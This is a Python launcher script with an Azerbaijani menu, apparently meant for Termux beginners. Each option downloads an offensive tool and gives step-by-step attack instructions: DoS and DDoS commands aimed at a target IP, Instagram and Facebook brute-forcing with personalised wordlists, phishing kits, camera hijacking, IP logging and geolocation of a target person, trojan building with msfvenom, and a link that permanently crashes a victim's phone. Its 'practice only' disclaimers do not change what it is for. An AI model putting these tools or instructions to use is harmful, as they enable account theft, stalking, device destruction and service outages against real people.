#!/usr/bin/env python3

import os
os.system("clear")
print("""\033[1;32;40m
 ____  _____ _   _____  _       _____ ___   ___  _
|  _ \| ____| | |_   _|/ \     |_   _/ _ \ / _ \| |
| | | |  _| | |   | | / _ \ _____| || | | | | | | |
| |_| | |___| |___| |/ ___ \_____| || |_| | |_| | |___
|____/|_____|_____|_/_/   \_\    |_| \___/ \___/|_____| v0.9
""")
print("              ===TERMUXX TOOLSS===")
print("     >>DΞLTΛ29.exe Tərəfindən Kodlanmışdır<<")
print("Yeni Baslayanlar Ucun En Cox Istifade Olunan Tool-lar")
print("""
Tool-la işə başlamazdan əvvəl, paketləri yükləyin
Paketləri yükləmək üçün, \033[1;31;40mpaketlər \033[1;32;40myazmağınız kifayətdir
Bunu hər dəfə tool-a giriş edəndə yenidən təkrarlamanız
Əslində daha yaxşı olar, çünkü Termux güncəllənir :)
Daha Ətraflı Məlumatı Seçim-ə \033[1;31;40mhaqqında \033[1;32;40myazaraq
Əldə edə bilərsiniz.
""")
print("""\033[1;32;40m[haqqinda] \033[1;37;40mTool Haqqında Məlumat
------------------------------------------------------
        	     \033[1;31;40m > sayt <
\033[1;32;40m [1] \033[1;37;40mHədəf Saytın IP Adressini tap :
\033[1;32;40m [2] \033[1;37;40mHədəf Sayt Haqqında Ümumi Məlumat :
\033[1;32;40m [3] \033[1;37;40mSadə Port Skanı :
\033[1;32;40m [4] \033[1;37;40mSaytda SQL açığı skanı :
\033[1;32;40m [5] \033[1;37;40mSayta hücum !!!
	 \033[1;33;40ma) DOS Attack 	 b) DDOS Attack
\033[1;32;40m [6] \033[1;37;40mRED-HAWK Tool-u
(ikinci secimin daha genis formasi)
\033[1;32;40m [7] \033[1;37;40mWordPress Scan
------------------------------------------------------
		\033[1;31;40m > Sosial Medyalar üçün <
    \033[1;31;40m-◇-İnstagram : \033[1;32;40mBruteForce Attack, Phishing-◇-
\033[1;32;40m[8] \033[1;37;40mInstagram üçün Brute-Force Attack
\033[1;32;40m[9] \033[1;37;40mInstagram üçün Phishing
  \033[1;31;40m-◇-FaceBook : \033[1;32;40mBruteForce Attack, OSIF, Phishing-◇-
\033[1;32;40m[10] \033[1;37;40mFaceBook üçün Brute-Force
\033[1;32;40m[11] \033[1;37;40mOSIF
------------------------------------------------------
		   \033[1;31;40m > Nömrə Skanı <
\033[1;32;40m[12] \033[1;37;40mPhoneInfoga toolu vasitəsile
------------------------------------------------------
      \033[1;31;40m > Hədəf Şəxsin IP adresinin tapılması <
\033[1;32;40m[13] \033[1;37;40mFake link vasisəsilə
------------------------------------------------------
   \033[1;31;40m > IP adressdən məkan/lokasiyanın tapılması <
\033[1;32;40m[14] \033[1;37;40mIpGeoLocation toolu vasitəsilə
------------------------------------------------------
        \033[1;31;40m > Hədəf Şəxsin Telefonuna Sızma <
\033[1;32;40m[15] \033[1;37;40mTrojan ilə (metasploit)
------------------------------------------------------
	\033[1;31;40m > Hədəf cihazın kamerasına sızma <
\033[1;32;40m[16]\033[1;37;40mCAMERA-HACK Toolu ilə
------------------------------------------------------
    \033[1;31;40m > Hədəf Şəxsin Telefonunun Çökdürülməsi <
\033[1;32;40m[17] \033[1;37;40mInfect toolu vasitəsilə
------------------------------------------------------
""")
print("\033[1;32;40mSeçimi qeyd edin")
command = input("DΞLTΛ-TOOL ==> ")

if command=="nano" or command=="nano delta-tool.py":
	os.system("exit")
	os.system("nano delta-tool.py")
elif command=="1":
	print("""
Hədəf Saytın IP adresini saytı PING-ləmək yolu ilə tapırıq.
Indi sizə verilən yerə saytın adını yazacaqsınız.
Sonra isə, Saytın IP adressi bəlli olduqdan sonra,
CTRL ile C - yə basıb komandanı dayandıracaqsınız:)
""")
	hedefip=input("Hədəf saytı qeyd edin:(məs. www.google.com) : ")
	os.system("ping "+hedefip)
elif command=="2":
	print("NMAP ile sayt skani")
	hedefip=input("Hədəf saytı yazın:")
	os.system("nmap "+hedefip)
elif command=="3":
	print("""
Bu secim size saytdaki portlari
ve versiyalari gosterir.
""")
	hedefip=input("Hədəf saytı girin:")
	os.system("nmap -sV "+hedefip)
elif command =="4":
	os.system("git clone https://github.com/sqlmapproject/sqlmap")
	os.system("mv sqlmap $HOME")
	os.system("clear")
	print("""
Bu skan SQLMAP tool-u ile edilir.
DΞLTΛ-TOOL SqlMap-i sizin Termuxa yukleyib ;),
Saytda SQL açığı axtarmaq üçün 'sqlmap' tooluna -
cd sqlmap | yazaraq daxil olub,
saytı skanlamağınız kifayətdir.
Misal üçün :
python sqlmap.py -u www.google.com
""")
	secim=input("DΞLTΛ-Tool-a qayıtmaq üçün Q, Tooldan çıxmaq üçün Ç yazın : ")
	if secim=="Q" or secim=="q":
		os.system("python3 delta-tool.py")
	elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
		print("Hələlik..")
		quit()
	else:
		print("Yalnız Q və ya Ç seçə bilərsiniz. Tool-dan çıxılır.")
		quit()
elif command=="5":
	variant=input("Variantı daxil edin : ")
	if variant=="A" or variant=="a":
		os.system("clear")
		os.system("cowsay DOS Toolu yüklənir")
		os.system("git clone https://github.com/Quitten/doser.py")
		os.system("mv doser.py $HOME")
		os.system("clear")
		os.system("cowsay DOS Toolu yükləndi")
		print("""
Yalnız Maarifləndirici Əsaslar Daxilindədir ;)
Toola daxil olub, help menyusundan necə işlədilə
Biləcəyini öyrənə bilərsiniz.
""")
		secim=input("DΞLTΛ-Tool-a qayıtmaq üçün Q, Tooldan çıxmaq üçün Ç yazın : ")
		if secim=="Q" or secim=="q":
			os.system("python3 delta-tool.py")
		elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
			print("Hələlik")
			quit()
	elif variant=="B" or variant=="b":
		os.system("clear")
		os.system("cowsay Planetwork-DDOS Toolu yüklənir..")
		os.system("git clone https://github.com/Hydra7/Planetwork-DDOS")
		os.system("mv Planetwork-DDOS $HOME")
		os.system("clear")
		os.system("cowsay Planerwork-DDOS Toolu yükləndi")
		print("""
Yalnız Maarifləndirici Əsaslar Daxilindədir
cd Planetwork-DDOS | yazaraq
Planetwork-DDOS tooluna girib,
python2 pntddos.py yazmaqla toolu aktivləşdirə bilərsiniz.
DDOS hücumu üçün;
python2 pntddos.py <hədəf saytın IP adresi> 80 10
Yazmaq kifayətdir ;)
Hədəf Saytın IP adresini "1)"-ci üsulla tapa bilərsiniz.
""")
		secim=input("Tool-a qayıtmaq üçün Q, Tooldan çıxmaq üçün Ç yazın : ")
		if secim=="Q" or secim=="q":
			os.system("python3 delta-tool.py")
		elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
			print("Hələlik")
			quit()
	else:
		print("""Yuxarida Qeyd olunan A ve ya B variantlarindan
Birini Daxil ede bilersiniz.
""")
		secim=input("Tool-a qayıtmaq üçün Q, Tooldan çıxmaq üçün Ç  yazın : ")
		if secim=="Q" or secim=="q":
			os.system("python3 delta-tool.py")
		elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
			print("Hələlik..")
			quit()
		else:
			print("Yalnız Q və ya Ç seçə bilərsiniz. Tool-dan çıxılır.")
elif command=="6":
	os.system("clear")
	os.system("cowsay RED-HAWK tool-u yuklenir...")
	os.system("git clone https://github.com/Tuhinshubhra/RED_HAWK")
	os.system("mv RED_HAWK $HOME")
	os.system("clear")
	os.system("cowsay RED_HAWK toolu hazirdir.")
	print("""
Toolu işlək vəziyyətə salmaq üçün
Tool-a girib ;
chmod 777 rhawk.php
Sonra isə ;
php rhawk.php
Yazmağınız kifayətdir ;)
""")
	secim=input("Tool-a qayıtmaq üçün Q, Tooldan çıxmaq üçün Ç  yazın : ")
	if secim=="Q" or secim=="q":
		os.system("python3 delta-tool.py")
	elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
		print("Hələlik..")
		quit()
	else:
		print("Yalnız Q və ya Ç seçə bilərsiniz. Tool-dan çıxılır")
elif command=="7":
	os.system("clear")
	os.system("cowsay D-TECT Toolu yuklemededir :) ")
	os.system("git clone https://github.com/shawarkhanethicalhacker/D-TECT-1.git")
	os.system("mv D-TECT-1 $HOME")
	os.system("clear")
	os.system("cowsay D-TECT tool-u yuklenmisdir")
	print("""
Bu Tool size WordPress ile yaradilan
Saytlari skanlamaga komek edecek.
""")
	secim=input("Tool-a qayıtmaq üçün Q, Tooldan çıxmaq üçün Ç  yazın : ")
	if secim=="Q" or secim=="q":
		os.system("python3 delta-tool.py")
	elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
		print("Helelik :)")
		quit()
	else:
		print("Yalnız Q və ya Ç seçə bilərsiniz. Tool-dan çıxılır")
		quit()
elif command=="8":
	os.system("clear")
	os.system("cowsay Instagram üçün Brute Force Toolu yüklənir")
	os.system("git clone https://github.com/noob-hackers/ighack")
	os.system("mv ighack $HOME")
	os.system("clear")
	os.system("cowsay Wordlist üçün Cupp toolu yüklənir")
	os.system("git clone https://github.com/Mebus/cupp")
	os.system("mv cupp $HOME")
	os.system("clear")
	print("""
Bruteforce üçün əvvəlcə Cupp ilə
şəxsə özəl Wordlist hazırlayın,
Sonra isə "ighack" tooluna daxil olub,
"Manual" seçin,
Hesabı və wordlisti qeyd etdikdən sonra,
Attack başlayacaqdır """)
	os.system("cowsay Uğurlar!")
	secim=input("Tool-a qayıtmaq üçün Q, çıxmaq üçün Ç yazın : ")
	if secim=="Q" or secim=="q":
		os.system("python3 delta-tool.py")
	elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
		print("Hələlik..")
		quit()
	else:
		print("Yalnız Q və ya Ç seçə bilərsiniz. Tool-dan çıxılır")
elif command=="9":
	os.system("clear")
	os.system("cowsay Phishing üçün PHISHING-ATTACK toolu yüklənir..")
	os.system("git clone https://github.com/termuxxtoolss/PHISHING-ATTACK")
	os.system("mv PHISHING-ATTACK $HOME")
	os.system("clear")
	print("""
cd PHISHING-ATTACK&&chmod 777 phishing-attack.sh&&bash phishing-attack.sh

Bu əmr ilə Toola bir dəfəlik giriş edib istifadə edə bilərsiniz.
Sonraki girişlərdə isə
cd PHISHING-ATTACK
bash phishing-attack
Yazaraq Giriş edə bilərsiniz. Tool Daxilində
Instagram
Facebook
və WhatsApp kimi platformalar üçün Phishing var.
""")
	os.system("cowsay Uğurlar!")
	secim=input("Tool-a qayıtmaq üçün Q, çıxmaq üçün Ç seçin: ")
	if secim=="Q" or secim=="q":
		os.system("python3 delta-tool.py")
	elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
		print("Hələlik..")
		quit()
	else:
		print("Yalnız Q və ya Ç seçə bilərsiniz. Tooldan çıxılır")
elif command=="10":
	os.system("clear")
	os.system("cowsay FaceBook üçün Brute Force Toolu yüklənir..")
	os.system("git clone https://github.com/Gameye98/FBBrute")
	os.system("mv FBBrute $HOME")
	os.system("clear")
	print("""
Əvvəlcə "Cupp" toolu ilə şəxsə özəl Wordlist yaradın,
Sonra isə "FBBrute" tooluna daxil olub,
python fbbrute.py yazaraq aktivləşdirin.
Daha sonrasında hesabla Wordlisti seçin,
və attack-ı başladın.
""")
	os.system("cowsay Uğurlar!")
	secim=input("Tool-a qayıtmaq üçün Q, Çıxmaq üçün Ç seçin: ")
	if secim=="Q" or secim=="q":
		os.system("python3 delta-tool.py")
	elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
		print("Hələliikk..")
		quit()
	else:
		print("Yalnız Q və ya Ç seçə bilərsiniz. Tool-dan çıxılır")
elif command=="11":
	os.system("clear")
	os.system("cowsay OSIF Yüklənir...")
	os.system("git clone https://github.com/ciku370/OSIF")
	os.system("mv OSIF $HOME")
	os.system("clear")
	os.system("cowsay OSIF Yükləndi..")
	print("""
Toolu işlək vəziyyətə salmaq üçün:
pip2 install -r requirements.txt
Sonra isə;
python2 osif.py -yazaraq toola giriş edə bilərsiniz.
""")
	os.system("cowsay uğurlar!")
	secim=input("Tool-a qayıtmaq üçün Q, Tooldan çıxmaq üçün Ç seçin: ")
	if secim=="Q" or secim=="q":
		os.system("python3 delta-tool.py")
	elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
		print("hələlik:)")
		quit()
	else:
		print("Yalnız Q və ya Ç seçə bilərsiniz. Tool-dan çıxılır")
elif command=="12":
	os.system("clear")
	os.system("cowsay PhoneInfoga toolu yüklənir :) ")
	os.system("apt-get install wget tar")
	os.system("wget https://github.com/sundowndev/phoneinfoga/releases/download/v2.3.8/PhoneInfoga_Linux_arm64.tar.gz")
	os.system("mv PhoneInfoga_Linux_arm64.tar.gz $HOME")
	os.system("clear")
	os.system("cowsay Tool Hazırdır")
	print("""
PhoneIngoga Tool-una giriş etmək üçün :
1 - ls
2 - tar xvf PhoneInfoga_Linux_arm64.tar.gz
Bunu sadəcə tool-a ilk dəfə giriş edəndə yazmalısınız
Daha sonraki girişlərdə isə Tool-u istifadə etmək üçün,
./phoneinfoga
Yazmağınız kifayətdir. Hər Hansı bir nömrəni skan
Etmək üçün :
./phoneinfoga scan -n <hədəf şəxsin telefon nömrəsi>
""")
	os.system("cowsay Uğurlar!")
	secim=input("Toola qayıtmaq üçün Q, Tooldan çıxmaq üçün Ç seçin: ")
	if secim=="Q" or secim=="q":
		os.system("python3 delta-tool.py")
	elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
		print("HƏLƏLİK..")
		quit()
	else:
		print("Yalnız Q və ya Ç seçə bilərsiniz. Tool-dan çıxılır")
elif command=="13":
	os.system("cowsay Aşağını Oxu..")
	print("""
İnternetən IPlogger-dən necə istifadə olunduğunu araşdırıb öryənə
bilərsiniz :D
Sosyal Mühəndislik.
Hədəf şəxs sizin ona göndərdiyiniz
sayta giriş edəndə,
IP Adresi ekranda yazılır. Bu qədər..
""")
	os.system("cowsay Uğurlar!")
	secim=input("Tool-a qayıtmaq üçün Q, Çıxmaq üçün Ç seçin: ")
	if secim=="Q" or secim=="q":
		os.system("python3 delta-tool.py")
	elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
		print("Uğurlar")
		quit()
	else:
		print("Yalnız Q və ya Ç seçə bilərsiniz Tool-dan çıxılır")
elif command=="14":
	os.system("clear")
	os.system("cowsay IpGeoLocation toolu yüklənir...")
	os.system("git clone https://github.com/maldevel/IPGeoLocation")
	os.system("mv IPGeoLocation $HOME")
	os.system("clear")
	os.system("cowsay IPGeolocation toolu yüklənmişdir..")
	print("""
Toolun aktivləşdirilməsi üçün:
 cd IPGeoLocation && pip install -r requirements.txt
 chmod 777 ipgeolocation.py
 python ipgeolocation.py
Yazmalisiniz ;
  Öz IP adresinizi/yerinizi görmək üçün :
python ipgeolocation.py -m
  Hədəf şəxsin IP adresindən yerini öyrənmək üçün :
--(((IPlogger-dan IP-ni götürürdük..)))
python ipgeolocation.py -t <hədəf şəxsin ip-si>
""")
	os.system("cowsay Bu Qədər Uğurlar!")
	secim=input("Toola qayıtmaq üçün Q, çıxmaq üçün Ç seçin: ")
	if secim=="Q" or secim=="q":
		os.system("python3 delta-tool.py")
	elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
		print("hələlik..")
		quit()
	else:
		print("Yalnız Q və ya Ç seçə bilərsiniz. Tool-dan çıxılır")
elif command=="15":
	os.system("cowsay yükləmə başladılır")
	print("Yüklənilən Tool Metasploiti qurmağa kömək edir..")
	os.system("git clone https://github.com/jokzilla/metakurucu.git")
	os.system("mv metakurucu $HOME")
	os.system("clear")
	os.system("cowsay Metakurucu Toolu yüklənmişdir")
	print("""
Metasploiti qurmaq üçün,
Metakurucu tooluna daxil olub,
 chmod +x *
 bash metakurucu.sh
Yazmaq kifayətdir. Tool özü Metasploiti quracaqdır,
Siz sadəcə gələn suallarda "Y" basın, yəni təsdiq edin.
internet sürətindən asılı olaraq, max.20 dəqiqəyə
Metasploit qurulacaq.
Sonra isə, Termuxdan çıxıb yenidən giriş edin,
"ls" yazıb ekrana çıxan toollara baxın.
cd metasploit-framework
./msfconsole
Yazaraq konsol ekranına daxil ola ;
./msfvenom
Yazaraq trojan making ekranına gələ bilərsiniz.
""")
	os.system("cowsay Uğurlar!")
	secim=input("Tool-a qayıtmaq üçün Q, Tooldan çıxmaq üçün Ç  yazın : ")
	if secim=="Q" or secim=="q":
		os.system("python3 delta-tool.py")
	elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
		print("Hələlik..")
		quit()
	else:
		print("Yalnız Q və ya Ç seçə bilərsiniz. Tool-dan çıxılır.")
elif command=="16":
	os.system("clear")
	os.system("git clone https://github.com/termuxxtoolss/CAMERA-HACK")
	os.system("mv CAMERA-HACK $HOME")
	os.system("clear")
	os.system("cowsay CAMERA-HACK Toolu yüklənmişdir")
	print("""
cd CAMERA-HACK&&chmod 777 camera-hack.sh&&bash camera-hack.sh

Bu əmr ilə birdəfəlik toola giriş edə bilərsiniz.
Sonraki girişlərdə isə
cd CAMERA-HACK
bash camera-hack.sh yazaraq giriş edə bilərsiniz.
Çəkilən şəkilləri 2-ci seçim ilə yaddaşa yaza bilərsiniz""")
	os.system("cowsay Uğurlar!")
	secim=input("Tool-a qayıtmaq üçün Q, çıxmaq üçün Ç seçin: ")
	if secim=="Q" or secim=="q":
		os.system("python3 delta-tool.py")
	elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
		print("Hələlik..")
		quit()
	else:
		print("Yalnız Q və ya Ç seçə bilərsiniz. Tooldan çıxılır")
elif command=="17":
	os.system("clear")
	os.system("cowsay Infect toolu yüklənir..")
	os.system("git clone https://github.com/noob-hackers/infect")
	os.system("mv infect $HOME")
	os.system("clear")
	os.system("cowsay Infect toolu yüklənmişdir")
	print("""
Toola girmək üçün:
cd infect
chmod 777 infect.sh
bash infect.sh
1-infect now seçilir
--------------------
Gələn link-i hədəf şəxsə göndərib sənədi yükləməyini istəyirik,
Sosyal Mühəndislik lazımdır.
Hədəf şəxs sənədi yükləyib açanda, telefona Elite virusu düşür
və Android/IOS sistemi çökür.
Telefon bir daha açılmır.
Hər şey sizin öz mesuliyyetiniz daxilindədir,
yaradıcı heç bir məsuliyyət daşımır!!
""")
	secim=input("Tool-a qayıtmaq üçün Q, Tooldan çıxmaq üçün Ç  yazın : ")
	if secim=="Q" or secim=="q":
		os.system("python3 delta-tool.py")
	elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
		print("Hələlik..")
		quit()
	else:
		print("Yalnız Q və ya Ç seçə bilərsiniz. Tool-dan çıxılır.")
elif command=="Paketler" or command=="paketler" or command=="Paketlər" or command=="paketlər":
	os.system("clear")
	os.system("cowsay Paketlər yüklənirrrr..")
	print("""
bunun ucun telefonunuzda / cihazinizda
5 GB-a qeder bos yer olmalidir.
""")
	os.system("apt install git -y")
	os.system("apt install python -y")
	os.system("apt install python2 -y")
	os.system("apt install python3 -y")
	os.system("apt install busybox -y")
	os.system("apt install cmatrix -y")
	os.system("apt install dnsutils -y")
	os.system("apt install hashdeep -y")
	os.system("apt install nmap -y")
	os.system("apt install hydra -y")
	os.system("apt install pip")
	os.system("apt install pip")
	os.system("apt install pip2")
	os.system("apt install vim -y")
	os.system("apt install cat -y")
	os.system("apt install lolcat -y")
	os.system("apt install netcat -y")
	os.system("apt install ninja -y")
	os.system("apt install figlet -y")
	os.system("apt install toilet -y")
	os.system("apt install cowsay -y")
	os.system("apt install openssl -y")
	os.system("apt install php -y")
	os.system("apt install clang -y")
	os.system("apt install curl -y")
	os.system("pip install wordlist")
	os.system("apt install nodejs -y")
	os.system("apt install tor -y")
	os.system("apt update -y")
	os.system("apt upgrade -y")
	os.system("apt update -y")
	os.system("pkg update -y")
	os.system("pkg upgrade -y")
	os.system("pkg update -y")
	os.system("clear")
	os.system("python3 delta-tool.py")
elif command=="Haqqinda" or command=="Haqqında" or command=="haqqinda" or command=="haqqında":
	os.system("clear")
	print("""
			  >>>TERMUXX TOOLSS<<<
		   □-□-■-■-□-□-DΞLTΛ-TOOL-□-□-■-■-□-□
			Kodlayan - DΞLTΛ29.exe
	     Ən çox istifadə olunan əməliyyatlar bir Toolda.
		       İnkişaf mərhələsindədir.
	 -------------------------------------------------------
			 Yaradıcı ilə əlaqə :
		      Instagram : delta29exe
		        Telegram : @delta29exe
		     Telegram : @delta29exetools
		      Telegram : @termuxxtoolss
		     Gmail : delta29exe@gmail.com

     ~~> İradlar, suallar və təkliflər üçün əlaqə saxlaya bilərsiniz
     ----------------------------------------------------------------
Tool-un işləməsi üçün lazım olan paketlər:

	pkg install git
	pkg install python
	pkg install python3
	pkg install figlet
	pkg install cowsay

----------------------------------------------------------------------
Tool, DΞLTΛ29.exe tərəfindən kodlanmışdır,
Termux-a yeni baslamisinizsa, size cox komeyi deyecek :)
----------------------------------------------------------------------
Tool sadəcə praktika məqsədli yazılmışdır,
əlavə məqsədlərlə istifadəsi (kiməsə zərər məqsədli və s.) qadağandır
----------------------------------------------------------------------
Ola Bilsin Ki, Yuklenen Bezi Tool-lar Islemir,
Ya da kohnelib, yeni versiyasina guncellemek lazimdir.
Bele olduqda Yaradici ile Elaqe Saxlayaraq Bildirmeyiniz Xahis olunur.
Umumiyyetle, DΞLTΛ-TOOL-dan isttifade ucun,
Cihazinizda 5 GB-a qeder bos yer olmalidir.
[ TERMUXX TOOLSS _ RESPECT ]
""")
	secim=input("Tool-a qayıtmaq üçün Q, Tooldan çıxmaq üçün Ç  yazın : ")
	if secim=="Q" or secim=="q":
		os.system("python3 delta-tool.py")
	elif secim=="Ç" or secim=="ç" or secim=="C" or secim=="c":
		print("Hələlik..")
		quit()
	else:
		print("Yalnız Q və ya Ç seçə bilərsiniz. Tool-dan çıxılır.")
elif command=="EXIT" or command=="Exit" or command=="exit":
	os.system("clear")
	os.system("cowsay Hələlik ..")
	quit()
else:
	print("Secimi duzgun yazin")
	quit()

